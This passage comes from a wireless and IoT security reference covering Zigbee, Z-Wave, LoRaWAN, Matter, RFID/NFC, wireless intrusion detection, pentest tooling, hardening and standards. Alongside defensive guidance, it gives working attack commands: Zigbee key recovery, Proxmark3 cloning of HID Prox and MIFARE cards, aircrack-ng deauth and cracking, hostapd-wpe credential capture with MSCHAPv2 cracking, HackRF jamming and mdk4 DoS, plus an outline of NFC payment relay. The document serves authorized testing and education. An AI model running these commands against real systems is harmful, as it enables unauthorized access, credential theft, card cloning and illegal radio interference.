- Profiles cryptographically signed by SM-DP+.
- Mutual authentication between LPA and SM-DP+ (TLS with certificate pinning).
- Profile download protected end-to-end; operator keys never leave SM-DP+.
- eUICC has tamper-resistant secure enclave; keys not extractable.

**Attack surface:**
- SM-DP+ server compromise could allow fraudulent profile injection.
- LPA software vulnerabilities on device.
- Social engineering of eSIM transfer (analogous to SIM swap).
- **CVE-2022-26143 (TP240PhoneHome):** Amplification attack via MITEL devices, unrelated but demonstrates telecom protocol abuse.

---

## 5. Zigbee, Z-Wave, and IoT Protocols

### 5.1 Zigbee Security

Zigbee (IEEE 802.15.4) is used in home automation (Philips Hue, SmartThings, etc.).

**Security architecture:**
- **AES-128 CCM*** — authenticated encryption (Counter with CBC-MAC, asterisk = optional auth).
- **Key types:**
  - **Master Key** — used to establish link keys; pre-installed or OOB.
  - **Network Key** — shared by all nodes; encrypts all network-layer traffic.
  - **Link Key** — pairwise between two devices; application layer security.
  - **Transport Key** — temporary key used during key transport.

**Key transport:**
During joining (commissioning), the new device receives the Network Key from the Trust Center (coordinator). In Zigbee HA (Home Automation) 1.2, this key is often sent in the clear ("well-known" transport key = `5A6967426565416C6C69616E63653039`). This allows passive sniffing of the Network Key during device joining.

**Zigbee 3.0 improvements:**
- Mandatory link key encryption for NWK key transport.
- Installation code-based link keys (unique per device).
- But still often deployed with default transport keys in practice.

---

### 5.2 KillerBee Framework

KillerBee is a Python framework for attacking IEEE 802.15.4/Zigbee networks:

```bash
# Install
pip install killerbee

# Supported hardware: RZUSBSTICK, ApiMote, Freakduino, TelosB

# zbdump — capture packets
zbdump -i /dev/ttyUSB0 -w capture.pcap -c 11   # channel 11
zbdump -i /dev/ttyUSB0 -w capture.pcap -c 11 -n 100  # capture 100 frames

# zbstumbler — discover Zigbee networks
zbstumbler -i /dev/ttyUSB0 -v

# zbid — identify devices
zbid -f capture.pcap

# zbreplay — replay captured packets
zbreplay -i /dev/ttyUSB0 -r capture.pcap -c 11

# zbassoc — force association
zbassoc -i /dev/ttyUSB0 -s 0x1234 -p 0x5678 -c 11

# zbdecrypt — decrypt captured Zigbee traffic (if key known)
zbdecrypt -f capture.pcap -k 5A6967426565416C6C69616E63653039

# zbfind — direction finding (signal strength-based)
zbfind -i /dev/ttyUSB0 -c 11
```

**Key recovery attack:**
1. Put Zigbee coordinator into permit-join mode.
2. Sniff with zbdump while a device joins.
3. If Zigbee HA transport key used, Network Key sent in cleartext in "Transport-Key" command frame.
4. Use zbdecrypt with recovered key to decrypt all network traffic.

---

### 5.3 Z-Wave Security

Z-Wave operates at 908.42 MHz (US) / 868.42 MHz (EU), below the 2.4 GHz ISM band. This means standard 2.4 GHz tools cannot attack it — requires dedicated hardware (e.g., Z-Wave USB stick, HackRF).

**Z-Wave security frameworks:**

| Framework | Description | Weaknesses |
|---|---|---|
| S0 (legacy) | AES-128 encryption, static network key | Replay attacks; key exchanged in cleartext during inclusion |
| S2 (current) | ECDH key exchange during inclusion; per-device keys | Must verify DSK (Device Specific Key) to prevent MITM |

**S0 inclusion attack:**
During S0 inclusion, the network key is sent encrypted with the "all-zeros" key (`00000000000000000000000000000000`). An attacker sniffing the inclusion process captures the encrypted NWK key and decrypts it trivially.

**S2 inclusion security:**
- Uses ECDH (Curve25519) to derive session key for NWK key transport.
- DSK (9-digit QR code printed on device) is OOB authentication to prevent MITM.
- Three security classes: S2 Unauthenticated (no DSK), S2 Authenticated (DSK required), S2 Access Control (highest privilege).

**Tools:**
- `z-wave-js` — JavaScript Z-Wave controller library with logging.
- `OpenZWave` — open-source Z-Wave stack.
- `zwave-shepherd` — sniffing and analysis (software-defined radio).

---

### 5.4 LoRaWAN Security

LoRaWAN (Long Range Wide Area Network) is used for IoT at distances up to 15 km.

**Join procedures:**

**OTAA (Over-The-Air Activation) — preferred:**
```
Device → Network: JoinRequest(AppEUI, DevEUI, DevNonce)
Network → Device: JoinAccept(AppNonce, NetID, DevAddr, encrypted with AppKey)
→ Derive:
  NwkSKey = AES-128(AppKey, 0x01 || AppNonce || NetID || DevNonce || pad)
  AppSKey = AES-128(AppKey, 0x02 || AppNonce || NetID || DevNonce || pad)
```

**ABP (Activation by Personalization) — less secure:**
- NwkSKey and AppSKey hardcoded in device firmware.
- No dynamic key derivation.
- If firmware is extracted, all session keys are compromised.
- No replay protection reset on re-join.

**Security issues:**
- ABP devices with hardcoded keys — firmware extraction → full decrypt.
- Frame counter (FCnt) reuse due to device resets (some networks accept FCnt=0 reset).
- AppKey stored in device flash; side-channel or glitching attacks extract it.
- No per-device AppSKey in LoRaWAN 1.0 (fixed in 1.1 with NwkKey/AppKey separation).

---

### 5.5 Thread Protocol (802.15.4)

Thread is used in smart home devices (Google Nest, Apple HomePod, etc.) and is the network layer under the Matter/CHIP application protocol.

**Security features:**
- **Commissioning:** Uses DTLS with a network credential (passphrase + network key).
- **MLE (Mesh Link Establishment):** Authenticated with network key.
- **IEEE 802.15.4 link-layer encryption:** AES-CCM* with per-device frame counters.
- **External Commissioner:** Thread allows a remote device to commission new nodes; this role requires strong authentication.

**Key security controls:**
- Network Key (128-bit AES) distributed during commissioning.
- Commissioner must authenticate via PSKC (Pre-Shared Key for Commissioner).
- Border Router provides IPv6 connectivity with NAT64 and DNS64.

---

### 5.6 Matter / CHIP Protocol Security

Matter (formerly Project CHIP) is the smart home interoperability standard from the CSA (Connectivity Standards Alliance), supported by Apple, Google, Amazon, and Samsung.

**Security highlights:**
- **Passcode-authenticated session establishment (PASE):** Uses SPAKE2+ (CPace-based PAKE) during commissioning. Passcode printed on device (or QR code).
- **Certificate-authenticated session establishment (CASE):** After commissioning, uses NOC (Node Operational Certificate) + DAC (Device Attestation Certificate) — X.509 PKI.
- **DAC attestation:** Verifies device is genuine (signed by manufacturer CA → Matter Product Attestation Authority).
- **Fabric:** Nodes share a fabric (cryptographic domain); cross-fabric operations are controlled.
- **ACL (Access Control List):** Fine-grained attribute/command access per subject.

**Attack considerations:**
- DAC key extraction from device firmware is a critical threat.
- Commissioning window exposure (device in BLE advertising mode with passcode accessible).
- Multi-admin fabric: multiple controllers can administer the same device — CASE session revocation must be verified.

---

## 6. RFID and NFC Security

### 6.1 RFID Frequency Bands

| Band | Frequency | Range | Typical Use |
|---|---|---|---|
| LF | 125–134 kHz | < 10 cm | Access control (HID Prox, EM4100), animal tracking |
| HF | 13.56 MHz | < 1 m | Smart cards (MIFARE, DESFire), NFC, payment |
| UHF | 860–960 MHz | 1–12 m | Inventory, supply chain, retail |
| SHF | 2.45 / 5.8 GHz | 3–10 m | Toll (EZ-Pass), vehicle tracking |

---

### 6.2 HID Prox Card Vulnerabilities

HID Prox (125 kHz) is widely deployed in physical access control but has no cryptographic security:

- Card broadcasts its ID (Facility Code + Card Number) in FSK encoding.
- No authentication — any reader that can receive the signal accepts the card.
- Reader does not authenticate to card — no mutual authentication.

**Cloning with Proxmark3:**

```bash
# Proxmark3 commands
pm3 --> hw version            # firmware info
pm3 --> hf search             # search for HF card (13.56 MHz)
pm3 --> lf search             # search for LF card (125 kHz)

# HID Prox specific
pm3 --> lf hid read           # read HID Prox card
pm3 --> lf hid clone -r <rawdata>  # clone to T5577 blank card
pm3 --> lf hid sim -r <rawdata>    # simulate HID card (no physical card needed)

# EM4100 (another common LF format)
pm3 --> lf em 410x read       # read EM4100
pm3 --> lf em 410x clone --id <cardid>  # clone

# Sniff
pm3 --> lf sniff              # sniff LF traffic between card and reader
```

**Long-range cloning:** Devices like the Proxmark3 Easy with a larger antenna can read HID Prox cards from 10-30 cm, enabling surreptitious cloning (e.g., from a bag, through a wallet).

---

### 6.3 MIFARE Classic Attacks

MIFARE Classic (13.56 MHz) is the most widely deployed smart card family (transit cards, corporate access, parking). It uses a proprietary cipher called **CRYPTO1** that was reverse-engineered in 2008.

**CRYPTO1 weaknesses:**
- 48-bit LFSR stream cipher — short key.
- Weak PRNG — tag's nonce generation is predictable.
- Authentication protocol leaks key material.

**Nested Authentication Attack:**
```
1. Authenticate to one sector using known key (often default keys: FFFFFFFFFFFF, A0A1A2A3A4A5, etc.)
2. When authenticating to next sector, the tag uses a PRNG-derived nonce.
3. Because PRNG state is predictable from previous authenticated session, attacker can determine the new nonce.
4. Collect ~50-100 {nonce, encrypted_response} pairs.
5. Use nested attack to recover all unknown sector keys in ~1 second.
```

**Darkside Attack:**
```
1. Requires no known sector key.
2. Exploits parity bit leakage when authentication fails.
3. Send crafted authentication requests; probe one bit at a time.
4. Recover key with ~several hundred queries (offline in modern tools).
```

```bash
# Proxmark3 MIFARE attack workflow
pm3 --> hf search                      # detect card, get UID
pm3 --> hf mf autopwn                  # automated attack (nested + darkside + default keys)
pm3 --> hf mf dump --gen2              # dump all sectors to file
pm3 --> hf mf restore -f hf-mf-<uid>-dump.bin  # write dump to blank card
pm3 --> hf mf sim --uid <uid>          # simulate card

# Manual nested attack
pm3 --> hf mf nested --blk 0 -k FFFFFFFFFFFF --tblk 4 --tkey   # target block 4

# Check for default keys across all sectors
pm3 --> hf mf chk --1k                 # 1K card default key check
pm3 --> hf mf chk --4k                 # 4K card
```

---

### 6.4 MIFARE DESFire Security

MIFARE DESFire (EV1/EV2/EV3) replaces MIFARE Classic with real cryptography:

| Version | Crypto | Notes |
|---|---|---|
| DESFire (original) | 3DES | Deprecated; side-channel vulnerabilities |
| DESFire EV1 | 3DES, AES-128 | Most deployed; AES mode preferred |
| DESFire EV2 | AES-128 + transaction MAC | Proximity check, Transaction MAC |
| DESFire EV3 | AES-128 + Secure Channel | SUN (Secure Unique NFC) message |

**Authentication (EV1 AES example):**
```
1. PCD (reader) → PICC (card): Authenticate command + key number
2. PICC → PCD: RndB (encrypted, AES-ECB)
3. PCD decrypts RndB, generates RndA, sends AES-CBC-MAC(RndA || RndB')
4. PICC verifies and responds with AES-CBC-MAC(RndA')
5. Both derive session key = AES(RndA[0:8] || RndB[0:8] || RndA[8:16] || RndB[8:16])
```

**Known attacks:**
- **Side-channel on DESFire original:** Power analysis recovers 3DES key.
- **Relay attack:** No distance bounding — card signals can be relayed over NFC using a smartphone MITM.
- **Downgrade:** If system accepts both Classic and DESFire, attacker presents cloned Classic card.

---

### 6.5 NFC Relay Attacks and Payment Skimming

**NFC relay attack (payment skimming):**
```
Victim's card (mole device A, near victim) ↔ WiFi/Internet ↔ Attacker's POS device (mole device B)
```
1. Mole A holds NFC antenna near victim's contactless card (in wallet, pocket).
2. Mole A relays all NFC frames to mole B over the internet.
3. Mole B presents itself to a payment terminal as if it were the legitimate card.
4. Transaction authorized because cryptographic responses are relayed in real time.

**Countermeasures:**
- RFID-blocking wallets (Faraday cage).
- EMV transaction limits (contactless transactions often capped).
- CVC3 dynamic value — changes per transaction; only useful for CNP (Card Not Present) fraud if sniffed.
- Proximity check (DESFire EV2) — but not widely implemented in payment cards.

**NFCGate** — Android app for NFC relay research:
```
Device A (reader role) ↔ Internet ↔ Device B (emulator role, HCE)
```

---

### 6.6 UHF RFID Attacks

UHF RFID (EPC Gen2 / ISO 18000-6C) used in supply chain has minimal security:

- **No authentication in Gen2:** Reader sends Query → Tag responds with EPC (Electronic Product Code) and serial number.
- **Kill password:** 32-bit — permanently deactivates tag. Can be brute-forced (no rate limiting in spec).
- **Access password:** 32-bit — locks tag memory. Also brute-forceable.
- **Cloning:** Copy EPC to blank tag — identical in all respects.

**Tools:**
- Proxmark3 with UHF antenna (Proxmark3 RDV4.01 has LF/HF but not UHF natively).
- Impinj R420 + SDK for enterprise-grade testing.
- **RFIDler** — software-defined RFID emulator.
- **uhd-uhf** — GNU Radio-based UHF RFID reader.

**Inventory manipulation attacks:**
- Clone high-value items' EPC to cheap items (price tag swap for organized retail crime).
- Replay stored EPC to satisfy checkpoint scans.
- DoS by jamming UHF band with continuous carrier (illegal in most jurisdictions).

---

## 7. Wireless Intrusion Detection/Prevention

### 7.1 WIDS Architecture

**Dedicated sensor model:**
- Overlay sensors deployed throughout RF coverage area (not APs themselves).
- Sensors dedicated to monitoring; never serve client traffic.
- Higher coverage — sensors can be positioned for RF visibility, not client density.
- More expensive: separate hardware for every coverage zone.

**AP-based monitoring:**
- APs split time between serving clients and scanning other channels.
- Cisco CleanAir, Aruba AirMonitor — APs toggle between access mode and monitor mode.
- Lower cost; denser deployment of sensors.
- Coverage gaps — AP busy serving clients = less monitoring.

**Controller integration:**
WIDS data flows to:
- WLAN Controller (WLC) — for policy enforcement (rogue containment).
- SIEM — for correlation with wired events.
- Network management platform — for visualization.

---

### 7.2 Rogue AP Detection

**Methods:**

| Method | Description |
|---|---|
| SSID/BSSID monitoring | Maintain whitelist of authorized BSSIDs; alert on new/unexpected SSIDs |
| RF fingerprinting | Unique RF characteristics (clock skew, power amplifier distortion) identify specific radios |
| Wired correlation | If rogue AP is on wired network, its MAC appears in switch CAM table — correlate with seen BSSID |
| Probe request matching | Clients probe for known SSIDs; if unfamiliar AP responds, flag as potential evil twin |
| RSSI triangulation | Use multiple sensors to locate rogue by signal strength |

**Evil twin detection:**
- Two APs with same SSID but different BSSID — flag for investigation.
- BSSID that matches whitelist but on unexpected channel — cloning indicator.
- Same SSID with significantly higher signal strength than known AP — potential close-range evil twin.

---

### 7.3 Deauth Attack Detection

**Indicators:**
- High rate of Reason Code 7 deauth frames from unexpected sources.
- Client association/deassociation cycling faster than normal roaming.
- Deauth frames with source MAC not in authorized AP list.

**Detection logic:**
```python
# Simplified deauth flood detection (Scapy-based)
from scapy.all import *
from collections import defaultdict
import time

threshold = 20  # deauths per second
window = 1.0
events = defaultdict(list)

def detect(pkt):
    if pkt.haslayer(Dot11Deauth):
        src = pkt[Dot11].addr2
        now = time.time()
        events[src].append(now)
        events[src] = [t for t in events[src] if now - t < window]
        if len(events[src]) > threshold:
            print(f"[ALERT] Deauth flood from {src}: {len(events[src])} frames/sec")

sniff(iface="wlan0mon", prn=detect, store=False)
```

**Countermeasure:** 802.11w (Management Frame Protection) — see section 1.3.

---

### 7.4 Client Isolation

Client isolation prevents wireless clients on the same AP/SSID from communicating directly:

**Implementation:**
- **AP-level:** AP drops frames destined from one client to another client on same BSS.
- **VLAN-level:** Assign each client to a unique VLAN; inter-VLAN routing blocked by firewall.

**Use cases:**
- Guest networks — prevent lateral movement between guest devices.
- Hotspot environments.
- IoT segments — prevent IoT device compromise from reaching other IoT devices.

**Limitations:**
- Does not prevent communication through the internet (e.g., C2 over HTTPS).
- Does not prevent multicast/broadcast abuse.
- Layer 3 isolation requires firewall rules in addition to AP setting.

---

### 7.5 RF Spectrum Monitoring

**Waterfall display:**
Time-frequency visualization showing spectral power over time. Used to identify:
- Interference sources (microwave ovens, baby monitors, radar).
- Jamming attacks (continuous carrier, swept carrier, swept tone).
- Unauthorized frequency use.
- Channel utilization patterns.

**Tools:**
```bash
# Kismet — comprehensive wireless monitoring
kismet -c wlan0mon

# GQRX — SDR spectrum analyzer
gqrx  # Requires RTL-SDR or similar

# GNU Radio + RTL-SDR
rtl_power -f 2400M:2480M:1M -g 50 -i 1 -e 3600 power_scan.csv
heatmap.py power_scan.csv heatmap.png
```

**WIPS products:**

| Product | Vendor | Features |
|---|---|---|
| Cisco Adaptive wIPS | Cisco | CleanAir RF analysis, threat signatures, integrated into WLC |
| Aruba RFProtect | Aruba (HPE) | RF fingerprinting, rogue containment, forensic playback |
| Extreme AirDefense | Extreme Networks | Dedicated overlay WIDS, 24/7 monitoring, compliance reporting |
| WatchGuard Wi-Fi Cloud | WatchGuard | Cloud-managed WIDS, PCI compliance mode |

---

## 8. Wireless Penetration Testing

### 8.1 Hardware

| Device | Capabilities | Notes |
|---|---|---|
| Alfa AWUS036ACS | 802.11ac dual-band, 2.4/5 GHz, monitor mode, injection | Best general-purpose Wi-Fi pentest adapter |
| Alfa AWUS036ACH | 802.11ac dual-band, high-power | Dual antenna; good for long-range capture |
| Alfa AWUS1900 | 802.11ac, 4×4 MIMO | High throughput; for enterprise testing |
| HackRF One | 1 MHz – 6 GHz TX/RX, 20 MHz BW | SDR — Bluetooth, Zigbee, cellular, custom protocols |
| YARD Stick One | Sub-GHz (300-928 MHz) | Z-Wave, LoRa, ISM-band protocols |
| Ubertooth One | Bluetooth 2.4 GHz sniffer | BLE and Classic Bluetooth capture |
| Proxmark3 RDV4 | LF/HF RFID (125kHz, 13.56MHz) | Gold standard RFID/NFC research tool |
| WiFi Pineapple (MK7) | Dual-band evil twin, KARMA, modules | Purpose-built Wi-Fi pentest platform |
| RTL-SDR v3 | 500kHz – 1.75GHz receive only | Budget SDR for spectrum analysis |
| Flipper Zero | Sub-GHz, NFC, RFID, IR, BLE, iButton | Portable multi-protocol tool |

---

### 8.2 Aircrack-ng Suite Reference

```bash
# airmon-ng — manage monitor mode
airmon-ng                            # list wireless interfaces
airmon-ng check                      # show processes that may interfere
airmon-ng check kill                 # kill interfering processes
airmon-ng start wlan0                # create wlan0mon
airmon-ng start wlan0 11             # start on channel 11
airmon-ng stop wlan0mon              # stop monitor mode

# airodump-ng — capture and discover
airodump-ng wlan0mon                            # discover all networks
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon  # targeted capture
airodump-ng --band abg wlan0mon                 # 2.4 + 5 GHz scan
airodump-ng --manufacturer --uptime wlan0mon    # show extra info

# aireplay-ng — injection
aireplay-ng --test wlan0mon                              # injection test
aireplay-ng -0 5 -a <AP> -c <client> wlan0mon            # deauth
aireplay-ng -1 0 -e "SSID" -a <AP> -h <myMAC> wlan0mon  # fake auth
aireplay-ng -3 -b <AP> -h <myMAC> wlan0mon               # ARP replay
aireplay-ng -6 -b <AP> -h <myMAC> wlan0mon               # fragmentation attack

# aircrack-ng — crack
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
aircrack-ng -w - -b AA:BB:CC:DD:EE:FF capture-01.cap < <(crunch 8 8 0123456789)

# airdecap-ng — decrypt captured traffic
airdecap-ng -e "SSID" -p password capture-01.cap   # WPA/WPA2
airdecap-ng -w AABBCCDDEEFF capture-01.cap         # WEP (key in hex)

# airtun-ng — create virtual tunnel
airtun-ng -a <AP> -p password -e "SSID" wlan0mon   # create at0 tap interface

# packetforge-ng — craft packets
packetforge-ng -0 -a <AP> -h <myMAC> -l 255.255.255.255 -k 255.255.255.255 \
  -y frag-<n>-<n>.xor -w arp.cap
```

---

### 8.3 Wireshark Wireless Filters

```wireshark
# Frame types
wlan.fc.type == 0          # Management frames
wlan.fc.type == 1          # Control frames
wlan.fc.type == 2          # Data frames

# Management subtypes
wlan.fc.type_subtype == 8  # Beacon
wlan.fc.type_subtype == 4  # Probe request
wlan.fc.type_subtype == 5  # Probe response
wlan.fc.type_subtype == 0  # Association request
wlan.fc.type_subtype == 1  # Association response
wlan.fc.type_subtype == 11 # Authentication
wlan.fc.type_subtype == 12 # Deauthentication
wlan.fc.type_subtype == 10 # Disassociation

# EAPOL (WPA handshake)
eapol
wlan.fc.type_subtype == 8 && wlan.ssid contains "Target"  # Beacons for specific SSID

# Filter by BSSID
wlan.bssid == aa:bb:cc:dd:ee:ff
wlan.addr == aa:bb:cc:dd:ee:ff                # any address field

# Deauth storms
wlan.fc.type_subtype == 12 && wlan.fc.retry == 0

# EAP frames
eap
eap.code == 1              # EAP Request
eap.code == 2              # EAP Response
eap.type == 25             # PEAP
eap.type == 13             # EAP-TLS

# RSN (WPA2 info element)
wlan.rsn.version == 1

# Decrypt WPA2 traffic (if key known)
# Edit → Preferences → Protocols → IEEE 802.11 → Decryption Keys
# Add key: wpa-psk:password:SSID
```

---

### 8.4 WiFi Pineapple Reference

The WiFi Pineapple (Hak5 MK7) is a purpose-built Wi-Fi pentesting platform:

**PineAP modules:**
- **PineAP Daemon** — KARMA attack; responds to client probe requests.
- **Evil Twin** — clone a specific AP with optional credential harvesting portal.
- **Recon** — passive discovery of APs and clients.
- **Deauth** — targeted deauthentication.
- **Client Manager** — allow/deny specific client MACs.

**Useful modules (Community):**
- `DNSSpoof` — DNS poisoning for captive portal.
- `SSLsplit` — SSL MITM (limited to non-HSTS/non-pinned sites).
- `Responder` — LLMNR/NBT-NS/WPAD poisoning.
- `Veil` — payload generation.
- `RandomRoll` — randomize BSSID/channel.

**Setup:**
```bash
# Connect via SSH
ssh root@172.16.42.1

# Start PineAP via CLI
pineapd start

# Access web UI
http://172.16.42.1:1471
```

---

### 8.5 Testing 802.1X Enterprise Networks

**Goals:**
1. Recover EAP credentials (PEAP/MSCHAPv2 inner challenge-response).
2. Determine if server certificate is validated.
3. Test for EAP method downgrade.

**Hostapd-WPE workflow:**
```bash
# 1. Generate self-signed certificates (or copy from known CA)
openssl req -new -x509 -days 365 -keyout server.key -out server.pem -nodes \
  -subj "/CN=radius.targetcorp.com"

# 2. Configure hostapd-wpe
# (see hostapd-wpe.conf example in section 2.1)

# 3. Analyze captured credentials
cat /tmp/wpe_creds.log
# Format: MSCHAP challenge, NT response

# 4. Crack MSCHAPv2 hash
asleap -C <16-byte challenge in hex> -R <24-byte NT response in hex> -W rockyou.txt
# Or:
hashcat -m 5500 "username:::challenge_hex:response1:response2" rockyou.txt
# challenge_hex = MSCHAP challenge (8 bytes)
# response = NT response (24 bytes), split into two 12-byte halves
```

**Verifying certificate validation:**
Use a certificate with a different Common Name / different CA than legitimate server. If the client connects anyway — certificate validation is disabled/misconfigured.

---

### 8.6 Physical Layer Attacks

**Jamming:**
- Continuous carrier jamming — transmit continuous RF signal on target channel.
- Reactive jamming — detect frame preamble, immediately jam; harder to detect.
- Deceptive jamming — inject malformed frames; appears as interference.

```bash
# HackRF jamming (educational/authorized testing only)
hackrf_transfer -f 2437000000 -x 47 -s 20000000 -R   # 2.437 GHz (CH6)
# WARNING: Jamming is illegal in most jurisdictions (FCC §333, EU ETSI)

# mdk4 EAPOL flood (saturation attack on authentication)
mdk4 wlan0mon x -t AA:BB:CC:DD:EE:FF

# Michael countermeasure DoS (WPA-TKIP specific)
mdk4 wlan0mon m -t AA:BB:CC:DD:EE:FF
```

**Legal note:** All jamming and interference generation is illegal on public airwaves in virtually all jurisdictions. These capabilities are documented for authorized penetration testing in controlled environments only.

---

## 9. Wireless Hardening

### 9.1 SSID Hardening

**SSID broadcast:**
- Hiding SSID (disabling beacon SSID broadcast) provides minimal security — SSIDs are visible in probe requests and association frames.
- Recommendation: Do not rely on SSID hiding for security; but hidden SSIDs may reduce casual targeting.

**SSID naming:**
- Avoid SSIDs that reveal organization name, location, or AP hardware model.
- Use different SSIDs for different security zones (corporate, guest, IoT).

**Separate guest VLAN:**
```
Corporate SSID → VLAN 10 → Internal firewall → Corporate resources
Guest SSID → VLAN 100 → Internet-only firewall → No internal access
IoT SSID → VLAN 200 → Segmented firewall → Limited internet access
```

---

### 9.2 WPA3 Migration Checklist

- [ ] Inventory all wireless clients for WPA3 support (drivers, OS version).
- [ ] Enable WPA3-Personal (SAE) on APs; configure transition mode for legacy clients.
- [ ] Enable WPA3-Enterprise (192-bit mode) for high-security zones.
- [ ] Enable 802.11w (MFP) — set to `required` on WPA3-only SSIDs.
- [ ] Disable WPA1/TKIP on all SSIDs.
- [ ] Set minimum RSN IE: WPA2 + WPA3 on transition mode, WPA3-only on secure SSIDs.
- [ ] Verify SAE password element uses hash-to-element (patched against Dragonblood).
- [ ] Test WPA3-only clients cannot fall back to WPA2 on production SSIDs.
- [ ] Audit AP firmware versions; apply Dragonblood patches.
- [ ] Review transition mode exposure; plan eventual WPA3-only migration timeline.

---

### 9.3 Certificate-Based EAP-TLS Deployment Guide

EAP-TLS is the most secure EAP method — both client and server present X.509 certificates.

**PKI requirements:**
```
Root CA
└── Intermediate CA (RADIUS signing)
    └── RADIUS Server Certificate (server auth EKU)
└── Issuing CA (client certificates)
    └── Client Certificate per device (client auth EKU)
```

**RADIUS server configuration (FreeRADIUS):**
```
# /etc/freeradius/3.0/mods-enabled/eap
eap {
    default_eap_type = tls
    tls-config tls-common {
        private_key_file = /etc/ssl/private/radius.key
        certificate_file = /etc/ssl/certs/radius.pem
        ca_file = /etc/ssl/certs/ca-chain.pem
        dh_file = /etc/ssl/private/dh2048.pem
        cipher_list = "ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256"
        tls_min_version = "1.2"
        verify_depth = 3
        check_crl = yes
        crl_file = /etc/ssl/crl/ca.crl
    }
}
```

**Client certificate deployment:**
- SCEP (Simple Certificate Enrollment Protocol) via MDM for automated cert distribution.
- PKCS#12 bundle per device — distribute via MDM policy.
- Require EKU: Client Authentication (1.3.6.1.5.5.7.3.2).

**Client-side validation:**
- Configure supplicant (Windows NPS, Android, iOS, macOS) to:
  - Validate server certificate chain to trusted root.
  - Pin server certificate CN or SANs.
  - Reject connections if certificate is invalid or expired.

---

### 9.4 MAC Filtering Limitations

MAC filtering allows only pre-approved MAC addresses to associate:

**Limitations:**
- MAC addresses are transmitted in plaintext in 802.11 headers — trivially sniffable.
- Spoofing a MAC: `ip link set wlan0 address AA:BB:CC:DD:EE:FF` (Linux).
- In monitor mode: observe an authorized client's MAC, then clone it.
- Provides no protection against determined attackers; security by obscurity.

**When to use:**
- As one layer in a defense-in-depth strategy for IoT networks.
- To enforce known-device inventory (operational, not security goal).
- Combined with 802.1X, NAC, and network monitoring — not as a standalone control.

---

### 9.5 RF Power Level Tuning

Minimizing RF signal leakage beyond the physical perimeter reduces the attack surface:

- **Transmit power reduction:** Lower AP TX power so signal does not extend significantly beyond the building.
- **Directional antennas:** Point RF lobes inward; avoid omnidirectional coverage in perimeter-adjacent areas.
- **Site survey:** Conduct RF site survey to identify leakage points (windows, parking lots).
- **Channel planning:** Assign non-overlapping channels (1, 6, 11 for 2.4 GHz; 36, 40, 44, 48 etc. for 5 GHz) to minimize co-channel interference and simplify monitoring.

---

### 9.6 Regulatory Compliance

| Jurisdiction | Regulator | Key Rules |
|---|---|---|
| United States | FCC (Part 15) | Maximum EIRP: 4W (2.4 GHz), varies by 5 GHz band |
| European Union | ETSI (EN 300 328, EN 301 893) | Max 100 mW EIRP (2.4 GHz), Dynamic Frequency Selection (DFS) required on 5 GHz |
| United Kingdom | Ofcom (post-Brexit ETSI alignment) | Similar to EU; separate type approval |
| Japan | MIC (Ministry of Internal Affairs) | Certification required; strict outdoor limits |
| Canada | ISED | Aligned with FCC rules |
| Australia | ACMA | Aligned with ETSI |

**Key compliance considerations:**
- **DFS (Dynamic Frequency Selection):** Mandatory on 5 GHz channels 52-144 in EU/US — AP must detect radar and vacate channel within 10 seconds.
- **TPC (Transmit Power Control):** Required on 5 GHz; AP adapts power based on client capability.
- **FCC §333:** Prohibits jamming or interfering with licensed RF transmissions. Civil and criminal penalties.

---

## 10. Standards and Frameworks

### 10.1 IEEE 802.11 Security Standards Timeline

```
1997  IEEE 802.11 original (WEP — RC4-based, 40/104-bit key)
1999  802.11b ratified (higher speeds, WEP still used)
2001  FMS attack published — WEP shown cryptographically broken
2003  WPA released (Wi-Fi Alliance) — TKIP as interim fix
2004  IEEE 802.11i ratified (WPA2) — CCMP/AES mandated
2007  WPA2 mandatory for Wi-Fi Alliance certification
2009  IEEE 802.11w — Management Frame Protection (MFP)
2012  IEEE 802.11r — Fast BSS Transition (roaming), 802.1X keys fast-roamed
2013  RC4 officially deprecated (RFC 7465 for TLS; similar guidance for TKIP)
2018  WPA3 announced (Wi-Fi Alliance) — SAE, 192-bit enterprise mode
2019  WPA3 certifications begin; Dragonblood vulnerabilities disclosed
2019  IEEE 802.11ax (Wi-Fi 6) ratified — OFDMA, BSS coloring, improved efficiency
2020  WPA3 mandatory for Wi-Fi CERTIFIED devices
2021  Wi-Fi 6E (6 GHz band extension) — same security, new spectrum
2022  IEEE 802.11be (Wi-Fi 7) development — MLO (Multi-Link Operation)
2024  Wi-Fi 7 certification — Enhanced MFP, updated SAE
```

---

### 10.2 NIST SP 800-97

**NIST SP 800-97: Establishing Wireless Robust Security Networks (2007)**

Key guidance areas:
- **RSNA (Robust Security Network Association):** Framework for WPA2/802.11i deployment.
- **EAP selection guidance:** EAP-TLS preferred; PEAP acceptable with cert validation.
- **Key management:** Rotate GTK (Group Temporal Key) regularly; configure PMKSA caching appropriately.
- **Network segmentation:** Separate wireless from wired with firewall; treat wireless as untrusted zone.
- **Monitoring:** WIDS deployment, log collection, anomaly detection.

**Companion publications:**
- **NIST SP 800-153:** Guidelines for Securing Wireless LANs (updated 2012).
- **NIST SP 800-187:** Guide to LTE Security.
- **NIST SP 800-187r1:** Guide to 5G Security.
- **NIST IR 8200:** Interagency Report on Status of International IoT Standards.

---

### 10.3 PCI DSS Wireless Requirements

PCI DSS v4.0 requirements relevant to wireless:

| Requirement | Description |
|---|---|
| 1.3 | Restrict inbound/outbound traffic — wireless segment must be firewall-isolated from CDE |
| 2.2.1 | Configuration standards — disable WEP/WPA-TKIP; require WPA2+ |
| 2.3.2 | Protect wireless with strong cryptography on all transmission of cardholder data |
| 4.2.1 | Strong cryptography in transit — WPA2/WPA3 acceptable; WEP/WPA-TKIP prohibited |
| 9.4.3 | Physical access controls — wireless APs must be secured against unauthorized physical access |
| 11.2.1 | Authorized and unauthorized wireless access point discovery (quarterly scans) |
| 11.2.2 | Respond to detected unauthorized wireless APs within defined timeframe |
| 12.3.3 | Review wireless AP inventory and assess new risk at least once every 12 months |

**Wireless testing requirements:**
- 11.2.1 requires quarterly scanning for unauthorized wireless APs — using wireless analyzers, WIDS, or manual surveys.
- Evidence of scanning methodology, scan results, and remediation documentation required for audit.

---

### 10.4 FIPS 140-2/3 Wireless Cryptographic Modules

FIPS 140-2 (now transitioning to FIPS 140-3) defines security requirements for cryptographic modules used in US federal systems.

**Relevance to wireless:**
- Federal agencies must use FIPS-validated cryptographic modules in wireless infrastructure.
- WPA2/WPA3 AES implementations must be from FIPS 140-2/3 validated modules.
